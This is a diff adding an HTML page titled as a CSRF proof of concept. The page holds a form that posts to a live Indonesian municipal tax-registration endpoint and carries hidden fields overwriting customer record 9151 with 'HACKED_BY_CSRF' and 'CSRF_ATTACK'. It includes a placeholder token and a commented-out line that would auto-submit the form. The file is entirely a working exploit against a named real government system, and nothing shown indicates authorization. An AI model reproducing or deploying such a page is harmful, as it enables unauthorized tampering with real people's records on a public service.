@@ -1,0 +1,24 @@
+<html>
+  <body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>Click the button to test CSRF vulnerability</p>
+
+    <form
+      id="csrfForm"
+      action="https://e-sptpd.tangerangselatankota.go.id/reg_online/eksten_cwp/update"
+      method="POST"
+    >
+      <input type="hidden" name="csrf_token" value="x" />
+      <input type="hidden" name="rp" value="P" />
+      <input type="hidden" name="id" value="9151" />
+      <input type="hidden" name="customernm" value="HACKED_BY_CSRF" />
+      <input type="hidden" name="alamat" value="CSRF_ATTACK" />
+      <input type="submit" value="Test CSRF" />
+    </form>
+
+    <script>
+      // Auto-submit untuk testing
+      // document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
